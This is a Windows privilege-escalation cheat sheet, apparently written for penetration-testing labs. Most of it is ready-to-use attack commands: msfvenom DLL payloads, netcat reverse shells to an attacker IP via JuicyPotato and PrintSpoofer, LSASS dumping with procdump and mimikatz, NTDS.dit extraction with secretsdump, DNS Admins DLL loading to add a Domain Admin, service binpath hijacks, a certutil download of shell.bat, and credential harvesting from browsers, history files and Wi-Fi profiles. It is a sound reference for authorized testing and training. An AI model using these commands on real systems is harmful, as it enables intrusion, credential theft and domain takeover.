# Windows Privilege Escalation

## **Initial Enumeration**

### **Privilege Escalation Helper Tools**

**Miscellaneous:**

* [**Ghostpack Compiled Binaries**](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)
* [**UAC (User Account Control) Bypasses**](https://github.com/hfiref0x/UACME)
* [**Impacket Tools**](https://github.com/fortra/impacket/tree/master/examples)
* [**NetCat for Windows**](https://github.com/int0x33/nc.exe/)

**Exploit Suggesters:**

* [**winPEAS**](https://github.com/carlospolop/PEASS-ng/releases): Windows local Privilege Escalation Awesome Script.
* [**Seatbelt**](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries): C# local privilege escalation checks.
* [**PowerUp**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1): PowerShell script for finding common Windows privilege escalation vectors that rely on misconfigurations.
* [**SharpUp**](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries): C# version of PowerUp .
* [**JAWS**](https://github.com/411Hall/JAWS/tree/master): PowerShell script for enumerating privilege escalation vectors written in PowerShell 2.0 .
* [**Watson**](https://github.com/rasta-mouse/Watson): .NET tool to enumerate missing KBs and suggest exploits.
* [**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng)
* **Metasploit Local Exploit Suggester**: `use post/multi/recon/local_exploit_suggester` on a backgrounded meterpreter sessions .

**Credentials:**

* [**LaZagne**](https://github.com/AlessandroZ/LaZagne/releases/): Retrieve passwords stored on a local machine from Windows password storage mechanisms and many different sources.
* [**MimiKatz**](https://github.com/ParrotSec/mimikatz): Extract credentials, perform PtH, PtT, craft golden tickets and more.
* [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher): PowerShell tool to find and decrypt saved session information for remote access tools.

***

### **Enumerating Windows Protection**

* Check Windows Defender status: `Get-MpComputerStatus`
* List AppLocker rules: `Get-AppLockerPolicy -Effective \| select -ExpandProperty RuleCollections`
* Test AppLocker policy: `Get-AppLockerPolicy -Local \| Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone`

***

### **Processes and Jobs**

* List named pipes: `pipelist.exe /accepteula`
* List named pipes with PowerShell: `gci \\.\pipe\`
* Review permissions on a named pipe: `accesschk.exe /accepteula \\.\Pipe\lsass -v`
* Display running processes: `tasklist /svc`
* Enumerate scheduled tasks: `schtasks /query /fo LIST /v`
* Enumerate scheduled tasks with PowerShell: `Get-ScheduledTask \| select TaskName,State`
* Enumerate all Unquoted Service Paths: `wmic service get name,displayname,pathname,startmode \| findstr /i "auto" \| findstr /i /v "c:\windows\\" \| findstr /i /v """`

***

### **Kernel and OS**

* Display all environment variables: `set`
* View detailed system configuration information: `systeminfo`
* Get patches and updates: `wmic qfe`
* Get installed programs: `wmic product get name`
* Get Installed programs in PowerShell: `Get-WmiObject -Class Win32_Product \| select Name, Version`
* Enumerate computer description field: `Get-WmiObject -Class Win32_OperatingSystem \| select Description`

***

### **Registries**

* Query for always install elevated registry key (1): `reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer`
* Query for always install elevated registry key (2): `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`

***

### **Users and Groups**

* Get logged-in users: `query user`
* Get current user: `echo %USERNAME%`
* View current user privileges: `whoami /priv`
* View current user group information: `whoami /groups`
* Get all system user: `net user`
* Get all system groups: `net localgroup`
* View details about a group: `net localgroup administrators`
* Get password policy: `net accounts`
* Check permissions on a directory: `.\accesschk64.exe /accepteula -s -d C:\Scripts\`
* Check local user description field: `Get-LocalUser`

***

### **Network-Related**

* Display active network connections: `netstat -ano`
* Get interface, IP address and DNS information: `ipconfig /all`
* Review ARP table: `arp -a`
* Review routing table: `route print`

***

### **Credential Hunting**

* Search common configuration files containing the word "password":\
  `findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml`
* Searching file contents for a string: `findstr /spin "password" *.*`
* Search file contents with PowerShell:\
  `select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password`
* Search for file extensions:\
  `dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*`
* Search for file extensions using PowerShell:\
  `Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore`
* List `cmdkey` saved credentials (in memory): `cmdkey /list`
* Run SessionGopher to extract credentials:\
  `Import-Module .\SessionGopher.ps1` → `Invoke-SessionGopher -Target WINLPE-SRV01`
* Retrieve saved Chrome credentials: `.\SharpChrome.exe logins /unprotect`
* Search Chrome Dictionary Files containing passwords:\
  `gc 'C:\Users\username\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' \| Select-String password`
* Read the PowerShell History File: `gc (Get-PSReadLineOption).HistorySavePath`
* Retrieve saved wireless passwords: `netsh wlan show profile WIFINAME key=clear`
* Enumerate unattended installation files (files named `unattend.xml`) which may contain passwords, which are stored in plaintext or base64
* Enumerate `.kdbx` KeePass files and extract credentials using `python2.7 keepass2john.py file.kdbx`, followed by `hashcat -m 13400`
* Extract clipboard (copy-paste) data: `git clone https://github.com/inguardians/Invoke-Clipboard/blob/master/Invoke-Clipboard.ps1`
* Find all accessible powershell history files: `foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}`
* Retrieve password from Windows Sticky Notes:\
  `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`

***

## **UAC (User Account Control) Bypass**

* The following repository contains many different UAC Bypassing Techniques: [https://github.com/hfiref0x/UACME](https://github.com/hfiref0x/UACME)
* To check if UAC is enabled (0x1=true): `REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA`
* To check the UAC level(0x5=max level): `REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin`
* UAC bypasses leverage flaws or unintended functionality in different Windows builds.
* To check the Windows Build: \[environment]::OSVersion.Version
* Check the previous repository and see if anything exists for the target build number

**Example - UAC Bypass in Windows Build 14393**

1. We can basically bypass UAC by placing a malicious `srrstr.dll` DLL to the `WindowsApps` folder, which will be loaded in an elevated context
2. Generate malicious DLL file: `msfvenom -p windows/shell_reverse_tcp LHOST=our-ip LPORT=listening-port -f dll > srrstr.dll`
3. Transfer the DLL on the target machine
4. Start a netcat listener on the attacker machine: `nc -lvnp 4444`
5. Get a reverse shell: `C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe`

***

## **Excessive User Rights Abuse**

> * User privileges can be `assigned but disabled`.
> * Some of them can be `re-enabled` using scripts or commands depending on the privilege.

### **SeImpersonate & SeAssignPrimaryToken \[JuicyPotato, Printspoofer]**

> * These privileges can be used to trick a process running as `SYSTEM` to connect to the exploit process, handing over the token to be used.
> * In other words, whenever a user has one of these privileges, it's possible to get privilege escalation by impersonating `NT AUTHORITY\SYSTEM`

#### **Escalating Privileges with JuicyPotato**

1. Download juicypotato and nc.exe on the target machine
2. Check CLSIDs:
   1. Use `systeminfo` to get the OS version
   2. Select the right list according to the OS Version from [Juicy Potato CLSIDs](https://github.com/ohpe/juicy-potato/tree/master/CLSID)
   3. Download the `test_clsid.bat` file from the [JuicyPotato GitHub](https://github.com/ohpe/juicy-potato/blob/master/Test/test\_clsid.bat)
   4. Run `test_clsid.bat` and wait, then check the `result.log` file
   5. Inside that log file you will find different CLSIDs.
   6. Look for a CLSID with SYSTEM privileges
3. Start a netcat listener on the attacker machine: `nc -lvnp 4444`
4. Run JuicyPotato: `.\juicypotato.exe -l SAMEPORT -c CLSID_SYSTEM_FROM_RESULTS -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe attacker-ip SAME-LISTENING-PORT" -t *`
5. Disclaimer/Troubleshooting: the listening netcat port and the port specified after the `-l` flag need to be the same in order to get the reverse shell

***

#### **Escalating Privileges with PrintSpoofer**

> * JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards.
> * PrintSpoofer and RoguePotato can be used on them to leverage the same privileges and gain NT AUTHORITY\SYSTEM level access.

* We can use the tool to spawn a SYSTEM process in the current console, spawn a SYSTEM process on a desktop (if logged on locally or via RDP), or catch a reverse shell
* PoC to get a Reverse Shell:
  1. Download `printspoofer.exe` and `nc.exe` on the target machine
  2. Start a netcat listener on the attacker machine: `nc -lvnp 4444`
  3. Run PrintSpoofer: `PrintSpoofer.exe -c "c:\tools\nc.exe attacker-ip netcat-port -e cmd"`

***

### **SeDebugPrivilege**

> * SeDebugPrivilege determines which users can attach to or open any process, even a process they do not own.
> * Developers who are debugging their applications **DO NOT need** this user right.
> * Developers who are debugging new system components **need** this user right.
> * This user right provides access to sensitive and critical operating system components.
> * This user right can be used to capture sensitive information from system memory, or access/modify kernel and application structures
> * Sometimes, developer users are assigned the debugprivilege rather than being added to the administrators group, who have this privilege by default

#### **SeDebugPrivilege to Dump LSASS**

1. Use ProcDump to extract a dump of the LSASS process:\
   `procdump.exe -accepteula -ma lsass.exe lsass.dmp`
2. Using `mimikatz.exe`:
   * `sekurlsa::minidump`
   * `sekurlsa::logonPasswords`
   * Gain the `NTLM Hashes` to use for a `Pass the Hash` attack or to `crack` them

***

#### **SeDebugPrivilege to gain Remote Code Execution as SYSTEM**

1. Get this [PoC Script](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1) on the target system
2. Open an elevated powershell console (e.g. right click on PS and run as admin)
3. Run `tasklist` and look for a privileged process (e.g. `winlogon.exe`) and get its `PID`
4. Run the script: `.\psgetsys.ps1 [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")`

***

### **SeTakeOwnershipPrivilege**

> SeTakeOwnershipPrivilege is a `policy setting` that determines which users can take ownership of any securable object

* Check target file current ownership
  * **PowerShell:** `Get-ChildItem -Path 'C:\Path\to\file.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }`
  * **CMD:** `cmd /c dir /q 'C:\Path\to\file.txt'`
  * **Disclaimer:** Sometimes the owner won't show due to lack of permissions
* To **take ownership** of a file: `takeown /f 'C:\Path\to\file.txt'`
* To enable **full permissions** on a file: `icacls 'C:\Path\to\file.txt' /grant htb-student:F`

***

### **SeBackupPrivilege**

> * A user with SeBackupPrivilege enabled can bypass file and directory, registry, and other persistent object permissions for the purposes of backing up the system.
> * This will let us copy a file from a folder, bypassing any access control list (ACL).
> * However, we can't do this using the standard copy command.
> * Instead, we need to programmatically copy the data, making sure to specify the `FILE_FLAG_BACKUP_SEMANTICS` flag.
> * We can use the built-in `robocopy` tool or the following `PoC` to copy any file: https://github.com/giuliano108/SeBackupPrivilege

***

#### **SeBackupPrivilege to Copy any file**

1. `Import-Module .\SeBackupPrivilegeUtils.dll`
2. `Import-Module .\SeBackupPrivilegeCmdLets.dll`
3. If the privilege is assigned but disabled, use `Set-SeBackupPrivilege` and verify with `Get-SeBackupPrivilege`
4. Copy a file: `Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt`

***

#### **SeBackupPrivilege to Copy any file with robocopy \[Built-in Utility]**

* Robocopy is a built-in utility that can be used to copy files in backup mode.
* No external tools are required
* `robocopy /B E:\Windows\NTDS .\ntds ntds.dit`

***

#### **SeBackupPrivilege to copy NTDS.dit**

> * The NTDS.dit file is locked by default
> * We can use the Windows `diskshadow` utility to **create a shadow copy** of the C drive and expose it as E drive.
> * The NTDS.dit in this shadow copy won't be in use by the system.
> * Then, we can use the `Copy-FileSeBackupPrivilege cmdlet` to bypass the ACL and copy the NTDS.dit locally.

Follow these steps:

1. `Import-Module .\SeBackupPrivilegeUtils.dll`
2. `Import-Module .\SeBackupPrivilegeCmdLets.dll`
3. If the privilege is assigned but disabled, use `Set-SeBackupPrivilege` and verify with `Get-SeBackupPrivilege`
4. Copy the NTDS file: `Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit`
5. Extract hashes using SecretsDump: `secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL`

***

### **SeLoadDriverPrivilege**

> * This policy setting determines which users can dynamically load and unload device drivers.
> * This user right is not required if a signed driver for the new hardware already exists in the driver.cab file on the device
> * Device drivers run as highly privileged code.

**Example - Capcom.sys**

* A typically vulnerable driver to this attack is Capcom.sys, which can allow any user to execute shellcode with SYSTEM privileges
* Download on the target machine: [Capcom.sys file](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
* Download EopLoadDriver and transfer on the target machine: [EopLoadDriver](https://github.com/TarlogicSecurity/EoPLoadDriver/)
* PoC Usage: `EOPLOADDRIVER.exe RegistryServicePath DriverImagePath`
*
* PoC Usage with CapCom.sys: `EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\path-to-downloaded\Capcom.sys`

***

### **SeSecurityPrivilege**

* This policy setting determines which users can specify object access audit options for individual resources such as files, Active Directory objects, and registry keys.
* These objects specify their system access control lists (SACL).
* A user assigned this user right can also view and clear the Security log in Event Viewer.

***

### **SeRestorePrivilege**

* This security setting determines which users can bypass file, directory, registry, and other persistent object permissions when they restore backed up files and directories.
* It determines which users can set valid security principals as the owner of an object.

***

## **Built-in Groups Abuse**

### **Backup Operators Group**

* Membership of this group grants its members the `SeBackup` and `SeRestore` privileges.
* This group also permits logging in locally to a domain controller.

### **Event Log Readers Group**

* Organizations may enable logging of process command lines to help defenders monitor and identify malicious behavior
* Members of this group may read these logs, potentially `finding user credentials`
* Search security logs containing the word `/user` with the **built-in utility** `wevtutil`: `wevtutil qe Security /rd:true /f:text | Select-String "/user"`

### **Server Operators Group**

* This group allows members to administer Windows servers without needing assignment of Domain Admin privileges.
* It is a very highly privileged group that can log in locally to servers, including Domain Controllers.
* Members can modify services, access SMB shares, and backup files.
* Membership of this group confers the powerful SeBackupPrivilege and SeRestorePrivilege privileges and the ability to control local services.

### **Print Operators Group**

* Members of this group are granted the `SeLoadDriver` privilege
* Members can log on to DCs locally and "trick" Windows into loading a malicious driver.
* This is a good privilege to perform privilege escalation (see above in the `SeLoadDriverPrivilege` section)
* If we issue the command `whoami /priv`, and don't see the `SeLoadDriverPrivilege` from an unelevated context, _we will need to bypass UAC_

### **Hyper-V Administrators Group**

* The Hyper-V Administrators group has full access to all Hyper-V features.
* If Domain Controllers have been virtualized, then the virtualization admins should be considered Domain Admins.
* They can easily create a clone of the live Domain Controller and mount the virtual disk offline to obtain the NTDS.dit file and extract NTLM password hashes for all users in the domain.
* Whenever possible, we can leverage CVE-2018-0952 or CVE-2019-0841 to gain SYSTEM privileges.
* Otherwise, we can try to take advantage of an application on the server that has installed a service running in the context of SYSTEM, which is startable by unprivileged users.

### **DNS Admins Group**

* Members can load a DLL on a DC, but do not have the necessary permissions to restart the DNS server.
* They can load a malicious DLL and wait for a reboot as a persistence mechanism.
* Loading a DLL will often result in the service crashing.
* A more reliable way to exploit this group is to use [cube0x0's exploit](https://cube0x0.github.io/Pocing-Beyond-DA/).
* PoC to add a member to the Domain Admins Group:
  1. Generate dll: `msfvenom -p windows/x64/exec cmd='net group "domain admins" TARGETUSER /add /domain' -f dll -o adduser.dll`
  2. Transfer the file to the target machine
  3. Load a custom DLL: `dnscmd.exe /config /serverlevelplugindll C:path\to\adduser.dll`
  4. CMD only: `sc stop dns`
  5. CMD only: `sc start dns`
  6. Confirm group membership: `net group "Domain Admins" /dom`

### **Account Operators Group**

* Members can modify non-protected accounts and groups in the domain.

### **Remote Desktop Users Group**

* Members are not given any useful permissions by default
* The main use of members of this group are to Login Through Remote Desktop Services and can move laterally using the RDP protocol.

### **Remote Management Users Group**

* Members can log on to DCs with PSRemoting
* This group is sometimes added to the local remote management group on non-DCs

***

## **Weak Permissions - File System ACLs**

* We can use SharpUp to check for service binaries suffering from weak ACLs.
* To verify the ACLs for a specific file: `icacls C:\path\to\file`
* Ideally, you need (I)(F), which means full permissions, e.g. `BUILTIN\Users` or `Everyone:(I)(F)`
* To check a service's permissions: `accesschk.exe /accepteula -quvcw ServiceName`
* If you have full permissions on a service, then you can add the current user to the administrators localgroup
* To do so: \[Requires `CMD`]
  1. `sc config ServiceName binpath="cmd /c net localgroup administrators user-name /add"`
  2. `sc stop ServiceName`
  3. `sc start ServiceName`
  4. **Disclaimer:** when starting the service you will get an error due to the previous `sc config` command

***

## **Unquoted Service Paths**

* When a service is installed, the registry configuration specifies a path to the binary that should be executed on service start.
* If the binary is `not encapsulated within quotes`, Windows will attempt to locate the binary in **different folders**.
* For example, is the service binary path is `C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe`
* Then Windows will attempt to run the following executables:
  * `C:\Program.exe\`
  * `C:\Program Files (x86)\System.exe`
* In these cases, you can put a malicious executable in these directories to escalate privileges
* To enumerate all unquoted service paths: `wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """`

***

## **Other Commands - Living off the Land**

| **Command**                                                                   | **Description**             |
| ----------------------------------------------------------------------------- | --------------------------- |
| `certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat` | Transfer file with certutil |
| `certutil -encode file1 encodedfile`                                          | Encode file with certutil   |
| `certutil -decode encodedfile file2`                                          | Decode file with certutil   |